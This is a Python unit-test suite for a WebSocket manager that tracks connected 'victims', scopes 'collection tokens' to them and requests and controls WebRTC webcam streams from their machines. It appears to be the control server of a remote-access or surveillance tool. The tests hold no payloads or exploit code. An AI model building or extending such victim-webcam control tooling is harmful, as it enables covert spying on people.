import asyncio
import unittest

from core.websocket_manager import WebSocketManager


WEBCAM_SESSION_ID = "webcam-session-1234567890"


class FakeWebSocket:
    def __init__(self):
        self.json_messages = []

    async def send_json(self, message):
        self.json_messages.append(message)


class ReconnectingWebSocket:
    def __init__(self, manager, replacement, victim_id="victim-a"):
        self.manager = manager
        self.replacement = replacement
        self.victim_id = victim_id

    async def _reconnect_then_fail(self):
        await self.manager.connect_victim(self.victim_id, self.replacement)
        raise RuntimeError("old connection failed")

    async def send_text(self, _message):
        await self._reconnect_then_fail()

    async def send_json(self, _message):
        await self._reconnect_then_fail()


class CollectionTokenTests(unittest.IsolatedAsyncioTestCase):
    async def test_ping_loop_exposes_public_lifecycle_state(self):
        manager = WebSocketManager()

        self.assertFalse(manager.ping_loop_running)
        await manager.start_ping_loop()
        self.assertTrue(manager.ping_loop_running)
        await manager.stop_ping_loop()
        self.assertFalse(manager.ping_loop_running)

    async def test_token_is_scoped_to_active_victim(self):
        manager = WebSocketManager()
        websocket = object()

        await manager.connect_victim("victim-a", websocket)
        token = manager.get_collection_token("victim-a")

        self.assertTrue(manager.verify_collection_token("victim-a", token))
        self.assertFalse(manager.verify_collection_token("victim-b", token))
        self.assertFalse(manager.verify_collection_token("victim-a", "wrong"))

    async def test_disconnect_revokes_collection_token(self):
        manager = WebSocketManager()
        websocket = object()

        await manager.connect_victim("victim-a", websocket)
        token = manager.get_collection_token("victim-a")
        await manager.disconnect_victim("victim-a")

        self.assertFalse(manager.verify_collection_token("victim-a", token))
        self.assertIsNone(manager.get_collection_token("victim-a"))

    async def test_stale_disconnect_does_not_remove_replacement_connection(self):
        manager = WebSocketManager()
        old_websocket = object()
        replacement_websocket = object()

        await manager.connect_victim("victim-a", old_websocket)
        await manager.connect_victim("victim-a", replacement_websocket)
        replacement_token = manager.get_collection_token("victim-a")

        removed = await manager.disconnect_victim("victim-a", old_websocket)

        self.assertFalse(removed)
        self.assertTrue(manager.is_victim_connected("victim-a"))
        self.assertTrue(
            manager.verify_collection_token("victim-a", replacement_token)
        )

    async def test_failed_text_send_does_not_remove_reconnected_victim(self):
        manager = WebSocketManager()
        replacement = FakeWebSocket()
        old_websocket = ReconnectingWebSocket(manager, replacement)
        await manager.connect_victim("victim-a", old_websocket)

        sent = await manager.send_to_victim("victim-a", "message")

        self.assertFalse(sent)
        self.assertIs(manager.victims["victim-a"], replacement)

    async def test_failed_json_send_does_not_remove_reconnected_victim(self):
        manager = WebSocketManager()
        replacement = FakeWebSocket()
        old_websocket = ReconnectingWebSocket(manager, replacement)
        await manager.connect_victim("victim-a", old_websocket)

        sent = await manager.send_json_to_victim(
            "victim-a",
            {"type": "message"},
        )

        self.assertFalse(sent)
        self.assertIs(manager.victims["victim-a"], replacement)

    async def test_failed_ping_does_not_remove_reconnected_victim(self):
        manager = WebSocketManager()
        replacement = FakeWebSocket()
        old_websocket = ReconnectingWebSocket(manager, replacement)
        await manager.connect_victim("victim-a", old_websocket)

        alive = await manager.ping_victim("victim-a")

        self.assertFalse(alive)
        self.assertIs(manager.victims["victim-a"], replacement)

    async def test_webrtc_candidate_storage_is_bounded(self):
        manager = WebSocketManager(max_pending_candidates=2)
        await manager.connect_victim("victim-a", object())
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        first = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-candidate",
                "session_id": WEBCAM_SESSION_ID,
                "candidate": {"candidate": "candidate:1"},
            },
        )
        second = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-candidate",
                "session_id": WEBCAM_SESSION_ID,
                "candidate": {"candidate": "candidate:2"},
            },
        )
        excess = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-candidate",
                "session_id": WEBCAM_SESSION_ID,
                "candidate": {"candidate": "candidate:3"},
            },
        )

        self.assertEqual(first, "accepted")
        self.assertEqual(second, "accepted")
        self.assertEqual(excess, "limit")
        self.assertEqual(
            len(manager.pending_candidates["victim-a"]),
            2,
        )

    async def test_admin_ice_candidate_delivery_is_bounded(self):
        manager = WebSocketManager(max_pending_candidates=1)
        websocket = FakeWebSocket()
        await manager.connect_victim("victim-a", websocket)
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        first = await manager.send_ice_candidate_to_victim(
            "victim-a",
            WEBCAM_SESSION_ID,
            {"candidate": "candidate:1"},
        )
        excess = await manager.send_ice_candidate_to_victim(
            "victim-a",
            WEBCAM_SESSION_ID,
            {"candidate": "candidate:2"},
        )

        self.assertEqual(first, "accepted")
        self.assertEqual(excess, "limit")
        self.assertEqual(len(websocket.json_messages), 1)

    async def test_victim_ice_candidate_limit_survives_polling(self):
        manager = WebSocketManager(max_pending_candidates=1)
        await manager.connect_victim("victim-a", object())
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        first = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-candidate",
                "session_id": WEBCAM_SESSION_ID,
                "candidate": {"candidate": "candidate:1"},
            },
        )
        polled = await manager.get_victim_ice_candidates(
            "victim-a",
            WEBCAM_SESSION_ID,
        )
        excess = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-candidate",
                "session_id": WEBCAM_SESSION_ID,
                "candidate": {"candidate": "candidate:2"},
            },
        )

        self.assertEqual(first, "accepted")
        self.assertEqual(len(polled), 1)
        self.assertEqual(excess, "limit")

    async def test_duplicate_webrtc_offer_does_not_replace_active_offer(self):
        manager = WebSocketManager()
        await manager.connect_victim("victim-a", object())
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        first = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-offer",
                "session_id": WEBCAM_SESSION_ID,
                "offer": {"type": "offer", "sdp": "first"},
            },
        )
        duplicate = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-offer",
                "session_id": WEBCAM_SESSION_ID,
                "offer": {"type": "offer", "sdp": "second"},
            },
        )

        self.assertEqual(first, "accepted")
        self.assertEqual(duplicate, "stale")
        self.assertEqual(len(manager.webrtc_offers), 1)
        self.assertEqual(
            manager.webrtc_offers["victim-a"].data["sdp"],
            "first",
        )

    async def test_stale_webcam_signaling_is_ignored(self):
        manager = WebSocketManager()
        await manager.connect_victim("victim-a", object())
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        result = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-offer",
                "session_id": "different-session-1234567890",
                "offer": {"type": "offer", "sdp": "stale"},
            },
        )

        self.assertEqual(result, "stale")
        self.assertNotIn("victim-a", manager.webrtc_offers)

    async def test_stop_webcam_notifies_victim_and_clears_state(self):
        manager = WebSocketManager()
        websocket = FakeWebSocket()
        await manager.connect_victim("victim-a", websocket)
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID
        manager.pending_candidates["victim-a"] = [{"candidate": {}}]

        stopped = await manager.stop_webcam_session(
            "victim-a",
            WEBCAM_SESSION_ID,
        )

        self.assertTrue(stopped)
        self.assertNotIn("victim-a", manager.active_webcam_sessions)
        self.assertNotIn("victim-a", manager.pending_candidates)
        self.assertEqual(
            websocket.json_messages[-1],
            {
                "type": "webcam-stop",
                "victim_id": "victim-a",
                "session_id": WEBCAM_SESSION_ID,
            },
        )

    async def test_webcam_offer_is_correlated_to_fresh_session(self):
        manager = WebSocketManager()
        websocket = FakeWebSocket()
        await manager.connect_victim("victim-a", websocket)

        request = asyncio.create_task(
            manager.request_webcam_offer(
                "victim-a",
                WEBCAM_SESSION_ID,
                timeout=1,
            )
        )
        while not websocket.json_messages:
            await asyncio.sleep(0)
        session_id = websocket.json_messages[-1]["session_id"]

        result = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-offer",
                "session_id": session_id,
                "offer": {"type": "offer", "sdp": "fresh"},
            },
        )
        offer = await request

        self.assertEqual(result, "accepted")
        self.assertEqual(offer["session_id"], session_id)
        self.assertEqual(offer["offer"]["sdp"], "fresh")
        await manager.stop_webcam_session("victim-a", session_id)

    async def test_webcam_error_is_correlated_and_clears_session(self):
        manager = WebSocketManager()
        websocket = FakeWebSocket()
        await manager.connect_victim("victim-a", websocket)

        request = asyncio.create_task(
            manager.request_webcam_offer(
                "victim-a",
                WEBCAM_SESSION_ID,
                timeout=1,
            )
        )
        while not websocket.json_messages:
            await asyncio.sleep(0)
        session_id = websocket.json_messages[-1]["session_id"]

        result = await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webcam-error",
                "session_id": session_id,
                "code": "permission-denied",
            },
        )
        response = await request

        self.assertEqual(result, "accepted")
        self.assertEqual(response["error"], "permission-denied")
        self.assertNotIn("victim-a", manager.active_webcam_sessions)
        self.assertNotIn("victim-a", manager.webcam_errors)

    async def test_webcam_session_expires(self):
        manager = WebSocketManager(webcam_max_duration_seconds=0.01)
        websocket = FakeWebSocket()
        await manager.connect_victim("victim-a", websocket)

        request = asyncio.create_task(
            manager.request_webcam_offer(
                "victim-a",
                WEBCAM_SESSION_ID,
                timeout=1,
            )
        )
        while not websocket.json_messages:
            await asyncio.sleep(0)
        session_id = websocket.json_messages[-1]["session_id"]
        await manager.handle_victim_webrtc_message(
            "victim-a",
            {
                "type": "webrtc-offer",
                "session_id": session_id,
                "offer": {"type": "offer", "sdp": "fresh"},
            },
        )
        await request
        await asyncio.sleep(0.02)

        self.assertNotIn("victim-a", manager.active_webcam_sessions)
        self.assertEqual(websocket.json_messages[-1]["type"], "webcam-stop")

    async def test_wrong_session_cannot_stop_active_webcam(self):
        manager = WebSocketManager()
        await manager.connect_victim("victim-a", FakeWebSocket())
        manager.active_webcam_sessions["victim-a"] = WEBCAM_SESSION_ID

        stopped = await manager.stop_webcam_session(
            "victim-a",
            "different-session-1234567890",
        )

        self.assertFalse(stopped)
        self.assertEqual(
            manager.active_webcam_sessions["victim-a"],
            WEBCAM_SESSION_ID,
        )


if __name__ == "__main__":
    unittest.main()
